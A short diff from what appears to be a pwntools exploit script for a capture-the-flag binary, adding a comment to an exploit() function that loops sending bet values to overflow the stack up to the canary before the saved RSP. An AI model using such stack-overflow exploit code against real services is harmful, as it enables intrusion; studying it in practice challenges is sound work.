@@ -69,6 +69,7 @@ continue
 def exploit():
     offset_til_saved_rsp = 117
 
+    ## Overflowing until the canary on the stack
     for i in range(offset_til_saved_rsp-3):
         x = io.sendlineafter(b"Enter bet value: ", "5", timeout=5)
         print(x)
